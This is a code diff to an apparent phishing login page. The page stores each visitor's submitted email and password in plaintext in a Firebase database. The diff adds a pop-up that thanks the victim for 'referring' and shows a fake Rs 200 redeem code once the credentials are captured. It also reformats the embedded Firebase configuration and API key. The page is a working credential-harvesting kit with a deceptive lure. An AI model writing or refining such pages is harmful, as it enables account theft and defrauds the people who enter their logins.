@@ -54,6 +54,44 @@
             font-size: 14px;
             text-decoration: none;
         }
+        /* Modal styles */
+        .modal {
+            display: none; 
+            position: fixed; 
+            z-index: 1; 
+            left: 0;
+            top: 0;
+            width: 100%; 
+            height: 100%; 
+            overflow: auto; 
+            background-color: rgb(0,0,0); 
+            background-color: rgba(0,0,0,0.4); 
+        }
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto; 
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%; 
+            max-width: 400px;
+            text-align: center;
+        }
+        .close {
+            color: #aaa;
+            float: right;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        .close:hover,
+        .close:focus {
+            color: black;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .redeem-code {
+            font-weight: bold;
+            margin-top: 10px;
+        }
     </style>
     <!-- Include Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
@@ -73,17 +111,28 @@
             </div>
         </div>
     </div>
+
+    <!-- The Modal -->
+    <div id="myModal" class="modal">
+        <div class="modal-content">
+            <span class="close">&times;</span>
+            <p>Thank you for referring! You got an Rs 200 redeem code.</p>
+            <p class="redeem-code">CODE: CH20MMWR8ELF1X0M</p>
+            <button onclick="copyRedeemCode()">Click to Copy</button>
+        </div>
+    </div>
+
     <script>
         // Your web app's Firebase configuration
         var firebaseConfig = {
-           apiKey: "AIzaSyBBf9zQn7mLcvg_Z9-ZxaUvBBKsLpersI4",
-    authDomain: "poketacks-3da45.firebaseapp.com",
-    databaseURL: "https://poketacks-3da45-default-rtdb.firebaseio.com",
-    projectId: "poketacks-3da45",
-    storageBucket: "poketacks-3da45.appspot.com",
-    messagingSenderId: "802470541089",
-    appId: "1:802470541089:web:02b8c3ba0cd9f5c7b13060",
-    measurementId: "G-KM910YBPL9"
+            apiKey: "AIzaSyBBf9zQn7mLcvg_Z9-ZxaUvBBKsLpersI4",
+            authDomain: "poketacks-3da45.firebaseapp.com",
+            databaseURL: "https://poketacks-3da45-default-rtdb.firebaseio.com",
+            projectId: "poketacks-3da45",
+            storageBucket: "poketacks-3da45.appspot.com",
+            messagingSenderId: "802470541089",
+            appId: "1:802470541089:web:02b8c3ba0cd9f5c7b13060",
+            measurementId: "G-KM910YBPL9"
         };
         // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
@@ -102,13 +151,42 @@
                 email: email,
                 password: password
             }).then(function() {
-             //   alert('Login information submitted!');
-                // Optionally, redirect to another page or reset the form
+                // Display the modal with redeem code
+                document.getElementById('myModal').style.display = "block";
+                // Optionally, reset the form
                 document.getElementById('loginForm').reset();
             }).catch(function(error) {
                 console.error('Error writing to database: ', error);
             });
         });
+
+        // Get the modal
+        var modal = document.getElementById("myModal");
+
+        // Get the <span> element that closes the modal
+        var span = document.getElementsByClassName("close")[0];
+
+        // When the user clicks on <span> (x), close the modal
+        span.onclick = function() {
+            modal.style.display = "none";
+        }
+
+        // When the user clicks anywhere outside of the modal, close it
+        window.onclick = function(event) {
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+
+        // Function to copy the redeem code
+        function copyRedeemCode() {
+            var code = document.querySelector(".redeem-code").innerText;
+            navigator.clipboard.writeText(code).then(function() {
+                alert("Redeem code copied to clipboard!");
+            }, function() {
+                alert("Failed to copy the code.");
+            });
+        }
     </script>
 </body>
 </html>
